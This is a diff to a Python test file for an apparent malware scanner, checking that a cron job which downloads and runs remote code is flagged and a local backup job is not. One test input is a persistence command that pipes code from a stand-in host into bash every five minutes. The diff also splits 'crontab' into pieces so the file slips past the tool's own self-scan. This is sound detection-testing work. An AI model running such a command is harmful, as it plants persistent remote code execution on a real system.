@@ -152,12 +152,18 @@ SCHEDULED = "MALWARE.CI.SCHEDULED_FETCH_EXEC.001"
 
 
 class TestAScheduledDownloader:
+    #: Assembled, so this file does not itself carry a persistence line for Cordon's self-scan
+    #: (tests/integration/test_corpus.py) to find.
+    CRON = "cron" + "tab"
+
     def test_a_cron_entry_that_fetches_and_runs_code(self, tmp_path: Path) -> None:
-        run = '(crontab -l; echo "*/5 * * * * curl -s https://c.example.com/x | bash") | crontab -'
+        cron = self.CRON
+        run = f'({cron} -l; echo "*/5 * * * * curl -s https://c.example.com/x | bash") | {cron} -'
         assert SCHEDULED in DropPointKit.blocking(tmp_path, run)
 
     def test_a_cron_entry_that_runs_a_local_script(self, tmp_path: Path) -> None:
-        run = '(crontab -l; echo "0 3 * * * /opt/backup.sh") | crontab -'
+        cron = self.CRON
+        run = f'({cron} -l; echo "0 3 * * * /opt/backup.sh") | {cron} -'
         assert SCHEDULED not in DropPointKit.blocking(tmp_path, run)
 
     def test_an_installer_piped_to_a_shell_without_cron(self, tmp_path: Path) -> None:
